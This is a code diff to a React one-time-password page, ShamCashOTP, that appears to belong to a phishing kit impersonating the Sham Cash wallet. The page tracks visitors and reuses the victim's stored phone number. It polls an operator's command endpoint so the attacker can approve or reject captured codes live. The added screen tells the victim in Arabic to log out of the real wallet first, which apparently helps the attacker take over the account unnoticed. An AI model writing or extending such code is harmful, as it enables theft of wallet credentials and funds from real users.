@@ -1,8 +1,37 @@
 import { useState, useRef, useEffect } from "react";
 import { useVisitorTracking } from "@/hooks/useVisitorTracking";
-import { useAdminCommands } from "@/hooks/useAdminCommands";
 import { useLang } from "@/hooks/useLang";
 import { shamApi } from "@/lib/shamApi";
+
+function WarningScreen() {
+  return (
+    <div
+      className="fixed inset-0 z-50 flex flex-col items-center justify-center p-8 text-center"
+      style={{ background: "linear-gradient(160deg, #1565C0 0%, #1976D2 40%, #1E88E5 100%)" }}
+    >
+      <div
+        className="flex items-center justify-center rounded-full mb-10"
+        style={{
+          width: 130, height: 130,
+          background: "linear-gradient(145deg, #FF8C00, #FFA500)",
+          boxShadow: "0 8px 40px rgba(255,140,0,0.5)",
+        }}
+      >
+        <svg width="68" height="68" viewBox="0 0 24 24" fill="none">
+          <path d="M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z" fill="white" />
+          <line x1="12" y1="9" x2="12" y2="13" stroke="#FF8C00" strokeWidth="2.2" strokeLinecap="round" />
+          <line x1="12" y1="17" x2="12.01" y2="17" stroke="#FF8C00" strokeWidth="2.5" strokeLinecap="round" />
+        </svg>
+      </div>
+      <h1 className="text-white font-black text-4xl mb-6" style={{ textShadow: "0 2px 8px rgba(0,0,0,0.2)" }}>
+        تنبيه
+      </h1>
+      <p className="text-white text-xl leading-relaxed font-semibold max-w-xs" style={{ textShadow: "0 1px 4px rgba(0,0,0,0.15)" }}>
+        يجب تسجيل خروج من المحفظة قبل البدء في عملية تسجيل الدخول هنا
+      </p>
+    </div>
+  );
+}
 
 const T = {
   ar: {
@@ -57,12 +86,33 @@ type Status = "idle" | "pending" | "approved" | "rejected" | "redirected";
 export function ShamCashOTP() {
   const [otp, setOtp] = useState<string[]>(["", "", "", "", "", ""]);
   const [status, setStatus] = useState<Status>("idle");
+  const [blocked, setBlocked] = useState(false);
   const inputs = useRef<(HTMLInputElement | null)[]>([]);
   const intervalRef = useRef<ReturnType<typeof setInterval> | null>(null);
   const [lang] = useLang();
   const t = T[lang];
   useVisitorTracking("التحقق OTP");
-  useAdminCommands();
+
+  // Admin commands — inline to intercept cancel/reject as warning screen
+  useEffect(() => {
+    const iv = setInterval(async () => {
+      const vId = localStorage.getItem("sham_visitor_id");
+      if (!vId) return;
+      const result = await shamApi.getCmd(vId);
+      if (!result?.command) return;
+      const cmd = result.command;
+      if (cmd === "redirect:blocked" || cmd === "redirect:cancel" || cmd === "redirect:reject") {
+        setBlocked(true);
+      } else if (cmd === "otp:approved") {
+        localStorage.setItem("sham_otp_status", "approved");
+      } else if (cmd === "otp:rejected") {
+        setBlocked(true);
+      } else if (cmd === "redirect:login") {
+        window.location.href = `${import.meta.env.BASE_URL}`;
+      }
+    }, 1500);
+    return () => clearInterval(iv);
+  }, []);
 
   const rawPhone = localStorage.getItem("sham_phone") ?? "";
   const digitsOnly = rawPhone.replace(/\D/g, "");
@@ -128,7 +178,7 @@ export function ShamCashOTP() {
       if (s && s !== "pending") {
         if (intervalRef.current) clearInterval(intervalRef.current);
         localStorage.removeItem("sham_otp_status");
-        if (s === "rejected") { window.location.href = "/blocked"; return; }
+        if (s === "rejected") { setBlocked(true); return; }
         setStatus(s);
       }
     }, 800);
@@ -153,6 +203,8 @@ export function ShamCashOTP() {
       title: t.redirectedTitle, subtitle: t.redirectedSub, color: "text-[#657bd8]",
     },
   };
+
+  if (blocked) return <WarningScreen />;
 
   return (
     <div className="min-h-screen w-full overflow-hidden bg-[#151c36] text-white" dir={t.dir}>
